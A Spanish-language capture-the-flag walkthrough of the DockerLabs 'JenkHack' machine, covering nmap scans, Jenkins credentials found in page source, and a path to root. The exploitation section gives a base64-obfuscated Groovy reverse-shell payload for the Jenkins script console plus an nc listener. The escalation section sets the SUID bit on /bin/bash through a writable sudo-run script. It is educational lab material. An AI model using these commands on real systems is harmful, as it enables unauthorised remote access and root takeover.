#MAQUINA #DOCKERLABS #FACIL 
#JENKINS
<hr>
# RECONOCIMIENTO

Vamos a resolver **JenkHack** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 16:12 CET
Initiating ARP Ping Scan at 16:12
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 16:12, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:12
Scanning 172.17.0.2 [65535 ports]
Discovered open port 8080/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 443/tcp on 172.17.0.2
Completed SYN Stealth Scan at 16:12, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-02 16:12:55 CET for 0s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
80/tcp   open  http       syn-ack ttl 64
443/tcp  open  https      syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80, 443 y 8080 abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80,443,8080 172.17.0.2                   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 16:13 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000018s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Hacker Nexus - jenkhack.hl
443/tcp  open  ssl/http Jetty 10.0.13
|_http-server-header: Jetty(10.0.13)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2024-09-01T12:00:45
|_Not valid after:  2025-09-01T12:00:45
|_ssl-date: TLS randomness does not represent time
| http-robots.txt: 1 disallowed entry 
|_/
8080/tcp open  http     Jetty 10.0.13
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(10.0.13)
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.05 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 16:15 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
| http-enum: 
|_  /robots.txt: Robots file
8080/tcp open  http-proxy
| http-enum: 
|_  /robots.txt: Robots file
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.27 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Varios **robots.txt** .
## HTTP (80)
Al revisar la web que hay en el puerto 80, vemos que al hacer CTRL + U :

**Usuario -> jenkins-admin**
**Contraseña -> cassandra**

Nos deja entrar en el jenkins del puerto 8080.

# EXPLOTACION

Estando dentro del jenkins, iremos a `/script`, esto nos llevará a una script console que nos permitirá ejecutar comandos. Para enviarnos una reverse shell, debemos ejecutar esto:

```bash
def cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0MyAwPiYxCg==}|{base64,-d}|{bash,-i}"
def process = cmd.execute()
process.waitFor()
```

Esto nos enviará una reverse shell por el puerto 443, por lo que antes de ejecutarla escucharemos en ese puerto:

```bash
sudo nc -nlvp 443
```

# ESCALADA PRIVILEGIOS

Vemos una nota en /var/www/jenkhack:
   ```bash
jenkins@7626c23c43c0:/var/www/jenkhack$ cat note.txt 

jenkhack:C1V9uBl8!'Ci*`uDfP


```
**Usuario -> jenkhack**
**Contraseña -> jenkinselmejor** -> era base85

YA ESTAMOS COMO JENKHACK.

Vemos si el usuario tiene permisos SUDO:
   ```bash
jenkhack@7626c23c43c0:/opt$ sudo -l
Matching Defaults entries for jenkhack on 7626c23c43c0:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jenkhack may run the following commands on 7626c23c43c0:
    (ALL : ALL) NOPASSWD: /usr/local/bin/bash


```

Vemos que al ejecutar esa bash, se esta ejecutando un script **bash.sh en /opt**, la cosa es que el directorio es nuestro, entonces eliminamos el script y creamos otro con permisos 777 para que luego root pueda ejecutarlo:

   ```bash
jenkhack@7626c23c43c0:/opt$ ls -la
total 12
drwxrwxr-x 1 root     jenkhack 4096 Dec  3 12:31 .
drwxr-xr-x 1 root     root     4096 Dec  3 11:02 ..
-rwxrwxrwx 1 jenkhack jenkhack   54 Dec  3 12:31 bash.sh
jenkhack@7626c23c43c0:/opt$ cat bash.sh 
#!/bin/bash

# This script in bash
chmod +s /bin/bash
jenkhack@7626c23c43c0:/opt$ /bin/bash -p
bash-5.2# whoami
root

```

**YA ESTAMOS COMO ROOT.**